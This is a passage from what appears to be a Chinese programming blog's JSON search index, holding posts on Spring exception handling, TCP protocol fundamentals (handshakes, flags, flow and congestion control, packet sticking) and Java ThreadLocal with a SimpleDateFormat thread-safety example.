com.test.syncbackend.scheduleds.*.*(..))\u0026#34;) public void pointCut() { } @Around(\u0026#34;pointCut()\u0026#34;) public Object handlerException(ProceedingJoinPoint proceedingJoinPoint) { try { return proceedingJoinPoint.proceed(); } catch (Throwable ex) { log.error(\u0026#34;execute scheduled occur exception.\u0026#34;, ex); } return null; } } ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/spring%E4%BC%98%E9%9B%85%E7%9A%84%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/","series":["Manual"],"tags":["Spring"],"title":"Spring优雅的异常处理"},{"categories":["计算机科学"],"content":"参考链接\nhttp://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/other/ssl-tls%E5%8D%8F%E8%AE%AE/","series":["Manual"],"tags":["CS"],"title":"SSL/TLS协议"},{"categories":["计算机科学"],"content":"简介 数据在TCP层称为流（Stream），数据分组称为分段（Segment）。作为比较，数据在IP层称为Datagram，数据分组称为分片（Fragment）。 UDP 中分组称为Message。\nTCP 数据包的大小 以太网数据包（packet）的大小是固定的，最初是1518字节，后来增加到1522字节。其中， 1500 字节是负载（payload），22字节是头信息（head）。 IP 数据包在以太网数据包的负载里面，它也有自己的头信息，最少需要20字节，所以 IP 数据包的负载最多为1480字节。\n（图片说明：IP 数据包在以太网数据包里面，TCP 数据包在 IP 数据包里面。)\nTCP 数据包在 IP 数据包的负载里面。它的头信息最少也需要20字节，因此 TCP 数据包的最大负载是 1480 - 20 = 1460 字节。由于 IP 和 TCP 协议往往有额外的头信息，所以 TCP 负载实际为1400字节左右。\n因此，一条1500字节的信息需要两个 TCP 数据包。HTTP/2 协议的一大改进， 就是压缩 HTTP 协议的头信息，使得一个 HTTP 请求可以放在一个 TCP 数据包里面，而不是分成多个，这样就提高了速度。\n创建连接 TCP用三次握手（或称三路握手，three-way handshake）过程创建一个连接。在连接创建过程中，很多参数要被初始化，例如序号被初始化以保证按序传输和连接的强壮性。 一对终端同时初始化一个它们之间的连接是可能的。但通常是由一端打开一个套接字 （socket ）然后监听来自另一方的连接，这就是通常所指的被动打开（passive open）。服务器端被被动打开以后，用户端就能开始创建主动打开（active open）。\n 客户端通过向服务器端发送一个SYN来创建一个主动打开，作为三次握手的一部分。客户端把这段连接的序号设定为随机数A。 服务器端应当为一个合法的SYN回送一个SYN/ACK。ACK的确认码应为A+1，SYN/ACK包本身又有一个随机产生的序号B。 最后，客户端再发送一个ACK。此时包的序号被设定为A+1，而ACK的确认码则为B+1。当服务端收到这个ACK的时候，就完成了三次握手，并进入了连接创建状态。  注意：三次握手建立连接的时候， SYN/ACK 是一个数据包发送出去的\n注意：三次握手建立连接的时候， SYN/ACK 是一个数据包发送出去的\n如果服务器端接到了客户端发的SYN后回了SYN-ACK后客户端掉线了，服务器端没有收到客户端回来的ACK，那么，这个连接处于一个中间状态，即没成功，也没失败。于是，服务器端如果在一定时间内没有收到的TCP会重发SYN-ACK。在Linux下，默认重试次数为5次，重试的间隔时间从1s开始每次都翻倍，5次的重试时间间隔为1s, 2s, 4s, 8s, 16s，总共31s，第5次发出后还要等32s才知道第5次也超时了，所以，总共需要 1s + 2s + 4s+ 8s+ 16s + 32s = 63s，TCP才会断开这个连接。使用三个TCP参数来调整行为：tcp_synack_retries 减少重试次数；tcp_max_syn_backlog，增大SYN连接数；tcp_abort_on_overflow决定超出能力时的行为。\n数据传输  发送方首先发送第一个包含序列号为1（可变化）和1460字节数据的TCP报文段给接收方。接收方以一个没有数据的TCP报文段来回复（只含报头），用确认号1461来表示已完全收到并请求下一个报文段。 发送方然后发送第二个包含序列号为1461，长度为1460字节的数据的TCP报文段给接收方。正常情况下，接收方以一个没有数据的TCP报文段来回复，用确认号2921（1461+1460）来表示已完全收到并请求下一个报文段。发送接收这样继续下去。 然而当这些数据包都是相连的情况下，接收方没有必要每一次都回应。比如，他收到第1到5条TCP报文段，只需回应第五条就行了。在例子中第3条TCP报文段被丢失了，所以尽管他收到了第4和5条，然而他只能回应第2条。 发送方在发送了第三条以后，没能收到回应，因此当时钟（timer）过时（expire）时，他重发第三条。（每次发送者发送一条TCP报文段后，都会再次启动一次时钟：RTT）。 这次第三条被成功接收，接收方可以直接确认第5条，因为4，5两条已收到。  上图只考虑了一方发送数据一方接收数据的情形，如果是双方都收发数据的情形则如下图所示：\n上图一共4次通信。第一次通信，A 主机发给B 主机的数据包编号是1，长度是100字节，因此第二次通信 B 主机的 ACK 编号是 1 + 100 = 101，第三次通信 A 主机的数据包编号也是 101。同理，第二次通信 B 主机发给 A 主机的数据包编号是1，长度是200字节，因此第三次通信 A 主机的 ACK 是201，第四次通信 B 主机的数据包编号也是201。\n断开连接 所谓四次挥手（Four-Way Wavehand）即终止TCP连接，就是指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。在socket编程中，这一过程由客户端或服务端任一方执行close来触发，整个流程如下图所示：\n注意：四次分手断开连接的时候，ACK和FIN信号是分成两次发送的\n由于TCP连接是全双工的，因此，每个方向都必须要单独进行关闭。这一原则是当一方完成数据发送任务后，发送一个FIN来终止这一方向的连接，收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个TCP连接上仍然能够发送数据，直到这一方向也发送了FIN。首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭。\n 第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态。 第二次挥手：Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。 第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。 第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。 主动关闭端接收到FIN后，就发送ACK包，等待足够时间以确保被动关闭端收到了终止请求的确认包。【按照RFC 793，一个连接可以在TIME-WAIT保证最大四分钟，即最大分段寿命 （maximum segment lifetime）的2倍】   为什么建立连接是3次分手是4次？ 首先，因为tcp是全双工通信，即双方都需要收发数据，因此双方都要通过发送syn指令来随机初始化一个包序列seq，因为ack和syn的包不大，被动打开的一方一次性发送了ack和syn指令给主动打开的一方，主动打开方再回复一个ack，所以总共3次。 而分手的时候，存在类单双工的情形（即只有一方发数据，另外一方收数据），所以不能在回复fin的时候同时发送fin，即需要分开发送ack和fin，所以一共4次通信。\n 资源使用 主机收到一个TCP包时，用两端的IP地址与端口号来标识这个TCP包属于哪个session。使用一张表来存储所有的session，表中的每条称作Transmission Control Block（TCB），tcb结构的定义包括连接使用的源端口、目的端口、目的ip、序号、应答序号、对方窗口大小、己方窗口大小、tcp状态、tcp输入/输出队列、应用层输出队列、tcp的重传有关变量等。\n服务器端的连接数量是无限的，只受内存的限制。客户端的连接数量，过去由于在发送第一个SYN到服务器之前需要先分配一个随机空闲的端口，这限制了客户端IP地址的对外发出连接的数量上限。从Linux 4.2开始，有了socket选项IP_BIND_ADDRESS_NO_PORT，它通知Linux内核不保留usingbind使用端口号为0时内部使用的临时端口（ephemeral port），在connect时会自动选择端口以组成独一无二的四元组（同一个客户端端口可用于连接不同的服务器套接字 ；同一个服务器端口可用于接受不同客户端套接字的连接）。对于不能确认的包、接收但还没读取的数据，都会占用操作系统的资源。\n参考 传输控制协议 TCP 协议简介 图解TCP传输过程（三次握手、数据传输、四次挥手） TCP协议详解 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/tcp/tcp%E5%8D%8F%E8%AE%AE/","series":["Manual"],"tags":["CS"],"title":"TCP协议"},{"categories":["计算机科学"],"content":"1. 前言 网络层只把分组发送到目的主机，但是真正通信的并不是主机而是主机中的进程。传输层提供了进程间的逻辑通信，传输层向高层用户屏蔽了下面网络层的核心细节，使应用程序看起来像是在两个传输层实体之间有一条端到端的逻辑通信信道。\nUDP 和 TCP 的特点与区别 用户数据报协议 UDP（User Datagram Protocol） 是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。\n传输控制协议 TCP（Transmission Control Protocol） 是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。\n2. UDP TCP 首部格式 UDP 首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的。\nTCP 首部格式比 UDP 复杂。\n序号：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。\n确认号：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。\n数据偏移：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。\n控制位：八位从左到右分别是 CWR，ECE，URG，ACK，PSH，RST，SYN，FIN。\nCWR：CWR 标志与后面的 ECE 标志都用于 IP 首部的 ECN 字段，ECE 标志为 1 时，则通知对方已将拥塞窗口缩小；\nECE：若其值为 1 则会通知对方，从对方到这边的网络有阻塞。在收到数据包的 IP 首部中 ECN 为 1 时将 TCP 首部中的 ECE 设为 1；\nURG：该位设为 1，表示包中有需要紧急处理的数据，对于需要紧急处理的数据，与后面的紧急指针有关；\nACK：该位设为 1，确认应答的字段有效，TCP规定除了最初建立连接时的 SYN 包之外该位必须设为 1；\nPSH：该位设为 1，表示需要将收到的数据立刻传给上层应用协议，若设为 0，则先将数据进行缓存；\nRST：该位设为 1，表示 TCP 连接出现异常必须强制断开连接；\nSYN：用于建立连接，该位设为 1，表示希望建立连接，并在其序列号的字段进行序列号初值设定；\nFIN：该位设为 1，表示今后不再有数据发送，希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以相互交换 FIN 位置为 1 的 TCP 段。\n每个主机又对对方的 FIN 包进行确认应答之后可以断开连接。不过，主机收到 FIN 设置为 1 的 TCP 段之后不必马上回复一个 FIN 包，而是可以等到缓冲区中的所有数据都因为已成功发送而被自动删除之后再发 FIN 包；\n窗口：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。\n3. 什么是 TCP 的三次握手和四次挥手？ TCP 是一种面向连接的单播协议，在发送数据前，通信双方必须在彼此间建立一条连接。所谓的“连接”，其实是客户端和服务器的内存里保存的一份关于对方的信息，如 IP 地址、端口号等。\nTCP 可以看成是一种字节流，它会处理 IP 层或以下的层的丢包、重复以及错误问题。在连接的建立过程中，双方需要交换一些连接的参数。这些参数可以放在 TCP 头部。\nTCP 提供了一种可靠、面向连接、字节流、传输层的服务，采用三次握手建立一个连接；采用四次挥手来关闭一个连接。\n一个 TCP 连接由一个 4 元组构成，分别是两个 IP 地址和两个端口号。一个TCP连接通常分为三个阶段：启动、数据传输、退出（关闭）。\n当 TCP 接收到另一端的数据时，它会发送一个确认，但这个确认不会立即发送，一般会延迟一会（提供网络利用率这部分有讲到）。\nACK 是累积的，一个确认字节号 N 的 ACK 表示所有直到 N 的字节（不包括 N）已经成功被接收了。这样的好处是如果一个 ACK 丢失，很可能后续的 ACK 就足以确认前面的报文段了。\n一个完整的 TCP 连接是双向和对称的，数据可以在两个方向上平等地流动。给上层应用程序提供一种双工服务。一旦建立了一个连接，这个连接的一个方向上的每个 TCP 报文段都包含了相反方向上的报文段的一个 ACK。\n序列号的作用是使得一个 TCP 接收端可丢弃重复的报文段，记录以杂乱次序到达的报文段。因为 TCP 使用 IP 来传输报文段，而IP 不提供重复消除或者保证次序正确的功能。\n另一方面，TCP 是一个字节流协议，绝不会以杂乱的次序给上层程序发送数据。因此 TCP 接收端会被迫先保持大序列号的数据不交给应用程序，直到缺失的小序列号的报文段被填满。\n4. TCP 的三次握手（为什么三次？） 三次握手：\n假设 A 为客户端，B 为服务器端。\n首先 B 处于 LISTEN（监听）状态，等待客户的连接请求。\n A 向 B 发送连接请求报文，SYN=1，ACK=0，选择一个初始的序号 x。 B 收到连接请求报文，如果同意建立连接，则向 A 发送连接确认报文，SYN=1，ACK=1，确认号为 x+1，同时也选择一个初始的序号 y。 A 收到 B 的连接确认报文后，还要向 B 发出确认，确认号为 y+1，序号为 x+1。  B 收到 A 的确认后，连接建立。 为什么三次？ 1、第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。\n2、换个易于理解的视角来看为什么要 3 次握手。\n客户端和服务端通信前要进行连接，“3次握手”的作用就是双方都能明确自己和对方的收、发能力是正常的。\n第一次握手：客户端发送网络包，服务端收到了。这样服务端就能得出结论：客户端的发送能力、服务端的接收能力是正常的。\n第二次握手：服务端发包，客户端收到了。这样客户端就能得出结论：服务端的接收、发送能力，客户端的接收、发送能力是正常的。从客户端的视角来看，我接到了服务端发送过来的响应数据包，说明服务端接收到了我在第一次握手时发送的网络包，并且成功发送了响应数据包，这就说明，服务端的接收、发送能力正常。而另一方面，我收到了服务端的响应数据包，说明我第一次发送的网络包成功到达服务端，这样，我自己的发送和接收能力也是正常的。\n第三次握手：客户端发包，服务端收到了。这样服务端就能得出结论：客户端的接收、发送能力，服务端的发送、接收能力是正常的。第一、二次握手后，服务端并不知道客户端的接收能力以及自己的发送能力是否正常。\n而在第三次握手时，服务端收到了客户端对第二次握手作的回应。从服务端的角度，我在第二次握手时的响应数据发送出去了，客户端接收到了。所以，我的发送能力是正常的。而客户端的接收能力也是正常的。\n经历了上面的三次握手过程，客户端和服务端都确认了自己的接收、发送能力是正常的。之后就可以正常通信了。\n每次都是接收到数据包的一方可以得到一些结论，发送的一方其实没有任何头绪。我虽然有发包的动作，但是我怎么知道我有没有发出去，而对方有没有接收到呢？\n而从上面的过程可以看到，最少是需要三次握手过程的。两次达不到让双方都得出自己、对方的接收、发送能力都正常的结论。\n其实每次收到网络包的一方至少是可以得到：对方的发送、我方的接收是正常的。而每一步都是有关联的，下一次的“响应”是由于第一次的“请求”触发，因此每次握手其实是可以得到额外的结论的。\n比如第三次握手时，服务端收到数据包，表明看服务端只能得到客户端的发送能力、服务端的接收能力是正常的，但是结合第二次，说明服务端在第二次发送的响应包，客户端接收到了，并且作出了响应，从而得到额外的结论：客户端的接收、服务端的发送是正常的。\n5. TCP 的四次挥手（为什么四次？） 四次挥手：\n 客户端发送一个 FIN 段，并包含一个希望接收者看到的自己当前的序列号 K. 同时还包含一个 ACK 表示确认对方最近一次发过来的数据。 服务端将 K 值加 1 作为 ACK 序号值，表明收到了上一个包。这时上层的应用程序会被告知另一端发起了关闭操作，通常这将引起应用程序发起自己的关闭操作。 服务端发起自己的 FIN 段，ACK=K+1, Seq=L。 客户端确认。进入 TIME-WAIT 状态，等待 2 MSL（最大报文存活时间）后释放连接。ACK=L+1。  为什么建立连接是三次握手，而关闭连接却是四次挥手呢？\n1、TCP连接是双向传输的对等的模式，就是说双方都可以同时向对方发送或接收数据。当有一方要关闭连接时，会发送指令告知对方，我要关闭连接了。\n2、这时对方会回一个ACK，此时一个方向的连接关闭。但是另一个方向仍然可以继续传输数据，也就是说，服务端收到客户端的 FIN 标志，知道客户端想要断开这次连接了，但是，我服务端，我还想发数据呢？我等到发送完了所有的数据后，会发送一个 FIN 段来关闭此方向上的连接。接收方发送 ACK确认关闭连接。\n注意，接收到FIN报文的一方只能回复一个ACK, 它是无法马上返回对方一个FIN报文段的，因为结束数据传输的“指令”是上层应用层给出的，我只是一个“搬运工”，我无法了解“上层的意志”。\n3、客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 CLOSE-WAIT 状态。这个状态是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送 FIN 连接释放报文。\n4、因为服务端在 LISTEN 状态下，收到建立连接请求的 SYN 报文后，把 ACK 和 SYN 放在一个报文里发送给客户端。而关闭连接时，当收到对方的 FIN 报文时，仅仅表示对方不再发送数据了但是还能接收数据，己方是否现在关闭发送数据通道，需要上层应用来决定，因此，己方 ACK 和 FIN 一般都会分开发。\nTIME_WAIT\n客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL（maximum segment lifetime）。这么做有两个理由：\n 确保最后一个确认报文能够到达。如果 B 没收到 A 发送来的确认报文，那么就会重新发送连接释放请求报文，A 等待一段时间就是为了处理这种情况的发生。（server端发送关闭连接的FIN报文之后，它需要等待client发送一个确认报文，如果这个确认报文被丢失，server端会重发FIN报文，client端处于TIME_WAIT状态还能够再次回复一个确认报文） 等待一段时间是为了让本连接持续时间内所产生的所有报文都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文。  6. TCP 短连接和长连接的区别 短连接：Client 向 Server 发送消息，Server 回应 Client，然后一次读写就完成了，这时候双方任何一个都可以发起 close 操作，不过一般都是 Client 先发起 close 操作。短连接一般只会在 Client/Server 间传递一次读写操作。\n短连接的优点：管理起来比较简单，建立存在的连接都是有用的连接，不需要额外的控制手段。\n长连接：Client 与 Server 完成一次读写之后，它们之间的连接并不会主动关闭，后续的读写操作会继续使用这个连接。\n在长连接的应用场景下，Client 端一般不会主动关闭它们之间的连接，Client 与 Server 之间的连接如果一直不关闭的话，随着客户端连接越来越多，Server 压力也越来越大，这时候 Server 端需要采取一些策略，如关闭一些长时间没有读写事件发生的连接，这样可以避免一些恶意连接导致 Server 端服务受损；如果条件再允许可以以客户端为颗粒度，限制每个客户端的最大长连接数，从而避免某个客户端连累后端的服务。\n长连接和短连接的产生在于 Client 和 Server 采取的关闭策略，具体的应用场景采用具体的策略。\n什么时候用长连接，短连接？\n长连接多用于操作频繁，点对点的通讯，而且连接数不能太多情况，。每个TCP连接都需要三步握手，这需要时间，如果每个操作都是先连接，再操作的话那么处理速度会降低很多，所以每个操作完后都不断开，次处理时直接发送数据包就OK了，不用建立TCP连接。例如：数据库的连接用长连接， 如果用短连接频繁的通信会造成socket错误，而且频繁的socket 创建也是对资源的浪费。\n而像WEB网站的http服务一般都用短链接，因为长连接对于服务端来说会耗费一定的资源，而像WEB网站这么频繁的成千上万甚至上亿客户端的连接用短连接会更省一些资源，如果用长连接，而且同时有成千上万的用户，如果每个用户都占用一个连接的话，那可想而知吧。所以并发量大，但每个用户无需频繁操作情况下需用短连好。\n7. TCP粘包、拆包及解决办法 7.1 为什么常说 TCP 有粘包和拆包的问题而不说 UDP ？ 由前两节可知，UDP 是基于报文发送的，UDP首部采用了 16bit 来指示 UDP 数据报文的长度，因此在应用层能很好的将不同的数据报文区分开，从而避免粘包和拆包的问题。\n而 TCP 是基于字节流的，虽然应用层和 TCP 传输层之间的数据交互是大小不等的数据块，但是 TCP 并没有把这些数据块区分边界，仅仅是一连串没有结构的字节流；另外从 TCP 的帧结构也可以看出，在 TCP 的首部没有表示数据长度的字段，基于上面两点，在使用 TCP 传输数据时，才有粘包或者拆包现象发生的可能。\n7.2 什么是粘包、拆包？ 假设 Client 向 Server 连续发送了两个数据包，用 packet1 和 packet2 来表示，那么服务端收到的数据可以分为三种情况，现列举如下：\n第一种情况，接收端正常收到两个数据包，即没有发生拆包和粘包的现象。\n第二种情况，接收端只收到一个数据包，但是这一个数据包中包含了发送端发送的两个数据包的信息，这种现象即为粘包。这种情况由于接收端不知道这两个数据包的界限，所以对于接收端来说很难处理。\n第三种情况，这种情况有两种表现形式，如下图。接收端收到了两个数据包，但是这两个数据包要么是不完整的，要么就是多出来一块，这种情况即发生了拆包和粘包。这两种情况如果不加特殊处理，对于接收端同样是不好处理的。\n7.3 为什么会发生 TCP 粘包、拆包？  要发送的数据大于 TCP 发送缓冲区剩余空间大小，将会发生拆包。 待发送数据大于 MSS（最大报文长度），TCP 在传输前将进行拆包。 要发送的数据小于 TCP 发送缓冲区的大小，TCP 将多次写入缓冲区的数据一次发送出去，将会发生粘包。 接收数据端的应用层没有及时读取接收缓冲区中的数据，将发生粘包。  7.4 粘包、拆包解决办法 由于 TCP 本身是面向字节流的，无法理解上层的业务数据，所以在底层是无法保证数据包不被拆分和重组的，这个问题只能通过上层的应用协议栈设计来解决，根据业界的主流协议的解决方案，归纳如下：\n 消息定长：发送端将每个数据包封装为固定长度（不够的可以通过补 0 填充），这样接收端每次接收缓冲区中读取固定长度的数据就自然而然的把每个数据包拆分开来。 设置消息边界：服务端从网络流中按消息边界分离出消息内容。在包尾增加回车换行符进行分割，例如 FTP 协议。 将消息分为消息头和消息体：消息头中包含表示消息总长度（或者消息体长度）的字段。 更复杂的应用层协议比如 Netty 中实现的一些协议都对粘包、拆包做了很好的处理。  推荐 TCP粘包、拆包与通信协议详解 tcp的拆包和粘包 两篇文章详细描述了粘包拆包。\n8. TCP 可靠传输 TCP 使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就重传这个报文段。\n一个报文段从发送再到接收到确认所经过的时间称为往返时间 RTT，加权平均往返时间 RTTs 计算如下：\n其中，0 ≤ a ＜ 1，RTTs 随着 a 的增加更容易受到 RTT 的影响。超时时间 RTO 应该略大于 RTTs，TCP 使用的超时时间计算如下：\n其中 RTTd 为偏差的加权平均值。\n9. TCP 滑动窗口 窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。\n发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。\n接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 34, 35}，其中 {31} 按序到达，而 {34, 35} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。\n10. TCP 流量控制 流量控制是为了控制发送方发送速率，保证接收方来得及接收。\n接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。\n实际上，为了避免此问题的产生，发送端主机会时不时的发送一个叫做窗口探测的数据段，此数据段仅包含一个字节来获取最新的窗口大小信息。\n11. TCP 拥塞控制 如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接收，而拥塞控制是为了降低整个网络的拥塞程度。\nTCP 主要通过四个算法来进行拥塞控制：\n慢开始、拥塞避免、快重传、快恢复。\n发送方需要维护一个叫做拥塞窗口（cwnd）的状态变量，注意拥塞窗口与发送方窗口的区别：拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。\n为了便于讨论，做如下假设：\n 接收方有足够大的接收缓存，因此不会发生流量控制； 虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。  11.1 慢开始与拥塞避免 发送的最初执行慢开始，令 cwnd = 1，发送方只能发送 1 个报文段；当收到确认后，将 cwnd 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 \u0026hellip;\n注意到慢开始每个轮次都将 cwnd 加倍，这样会让 cwnd 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能性也就更高。设置一个慢开始门限 ssthresh，当 cwnd \u0026gt;= ssthresh 时，进入拥塞避免，每个轮次只将 cwnd 加 1。\n如果出现了超时，则令 ssthresh = cwnd / 2，然后重新执行慢开始。\n11.2 快重传与快恢复 在接收方，要求每次接收到报文段都应该对最后一个已收到的有序报文段进行确认。例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。\n在发送方，如果收到三个重复确认，那么可以知道下一个报文段丢失，此时执行快重传，立即重传下一个报文段。例如收到三个 M2，则 M3 丢失，立即重传 M3。\n在这种情况下，只是丢失个别报文段，而不是网络拥塞。因此执行快恢复，令 ssthresh = cwnd / 2 ，cwnd = ssthresh，注意到此时直接进入拥塞避免。\n慢开始和快恢复的快慢指的是 cwnd 的设定值，而不是 cwnd 的增长速率。慢开始 cwnd 设定为 1，而快恢复 cwnd 设定为 ssthresh。\n12. 提供网络利用率 12.1 Nagle 算法 发送端即使还有应该发送的数据，但如果这部分数据很少的话，则进行延迟发送的一种处理机制。具体来说，就是仅在下列任意一种条件下才能发送数据。如果两个条件都不满足，那么暂时等待一段时间以后再进行数据发送。\n 已发送的数据都已经收到确认应答。 可以发送最大段长度的数据时。  12.2 延迟确认应答 接收方收到数据之后可以并不立即返回确认应答，而是延迟一段时间的机制。\n 在没有收到 2*最大段长度的数据为止不做确认应答。 其他情况下，最大延迟 0.5秒 发送确认应答。 TCP 文件传输中，大多数是每两个数据段返回一次确认应答。  12.3 捎带应答 在一个 TCP 包中既发送数据又发送确认应答的一种机制，由此，网络利用率会提高，计算机的负荷也会减轻，但是这种应答必须等到应用处理完数据并将作为回执的数据返回为止。\n参考 一文搞定 UDP 和 TCP 高频面试题！ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/tcp/tcp%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9/","series":["Manual"],"tags":["CS"],"title":"TCP常见知识点"},{"categories":["编程思想"],"content":"ThreadLocal 是一个线程的本地变量，也就意味着这个变量是线程独有的，是不能与其他线程共享的，这样就可以避免资源竞争带来的多线程的问题，这种解决多线程的安全问题和lock(这里的lock 指通过synchronized 或者Lock 等实现的锁) 是有本质的区别的:\n lock 的资源是多个线程共享的，所以访问的时候需要加锁。 ThreadLocal 是每个线程都有一个副本，是不需要加锁的。 lock 是通过时间换空间的做法。 ThreadLocal 是典型的通过空间换时间的做法。  当然他们的使用场景也是不同的，关键看你的资源是需要多线程之间共享的还是单线程内部共享的。\nThreadLocal 的使用是非常简单的，看下面的代码：\npublic class Test { public static void main(String[] args) { ThreadLocal\u0026lt;String\u0026gt; local = new ThreadLocal\u0026lt;\u0026gt;(); //设置值  local.set(\u0026#34;hello word\u0026#34;); //获取刚刚设置的值  System.out.println(local.get()); } } ThreadLocal的数据结构 为什么ThreadLocalMap 采用开放地址法来解决哈希冲突? ThreadLocal 往往存放的数据量不会特别大，这个时候开放地址法简单的结构会显得更省空间（链地址法需要额外的指针空间）\n常用的hash解决方法有：拉链法（HashMap，指针需要占用空间）、开发地址（如果发生冲突，那就基于冲突位置再次探测寻址，直至不冲突，适用于记录总数可以预知的场景，如果位桶不够用就得扩容，扩容影响性能）、再hash（如果第1个hash函数冲突，那就使用第2个，多次hash是有时间成本的）\nThreadLocal应用场景 传递参数 ThreadLocal用于传递参数及优势 保证线程安全 SimpleDateFormat是线程不安全的，例如下面的写法会报错：\n日期转换的一个工具类\npublic class DateUtil { private static final SimpleDateFormat sdf = new SimpleDateFormat(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); public static Date parse(String dateStr) { Date date = null; try { date = sdf.parse(dateStr); } catch (ParseException e) { e.printStackTrace(); } return date; } } 然后将这个工具类用在多线程环境下\npublic static void main(String[] args) { ExecutorService service = Executors.newFixedThreadPool(20); for (int i = 0; i \u0026lt; 20; i++) { service.execute(()-\u0026gt;{ System.out.println(DateUtil.parse(\u0026#34;2019-06-01 16:34:30\u0026#34;)); }); } service.shutdown(); } 结果报异常了：\nException in thread \u0026#34;pool-1-thread-3\u0026#34; Exception in thread \u0026#34;pool-1-thread-12\u0026#34; Exception in thread \u0026#34;pool-1-thread-7\u0026#34; Exception in thread \u0026#34;pool-1-thread-1\u0026#34; Exception in thread \u0026#34;pool-1-thread-11\u0026#34; Exception in thread \u0026#34;pool-1-thread-5\u0026#34; java.lang.NumberFormatException: For input string: \u0026#34;\u0026#34; at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) at java.lang.Long.parseLong(Long.java:601) at java.lang.Long.parseLong(Long.java:631) at java.text.DigitList.getLong(DigitList.java:195) at java.text.DecimalFormat.parse(DecimalFormat.java:2084) at java.text.SimpleDateFormat.subParse(SimpleDateFormat.java:1869) at java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1514) at java.text.DateFormat.parse(DateFormat.java:364) at Test.parse(Test.java:15) at Test.lambda$main$0(Test.java:27) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) java.lang.NumberFormatException: multiple points at sun.misc.FloatingDecimal.readJavaFormatString(FloatingDecimal.java:1890) at sun.misc.FloatingDecimal.parseDouble(FloatingDecimal.java:110) at java.lang.Double.parseDouble(Double.java:538) at java.text.DigitList.getDouble(DigitList.java:169) at java.text.DecimalFormat.parse(DecimalFormat.java:2089) at java.text.SimpleDateFormat.subParse(SimpleDateFormat.java:1869) at java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1514) at java.text.DateFormat.parse(DateFormat.java:364) at Test.parse(Test.java:15) at Test.lambda$main$0(Test.java:27) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) java.lang.NumberFormatException: multiple points at sun.misc.FloatingDecimal.readJavaFormatString(FloatingDecimal.java:1890) at 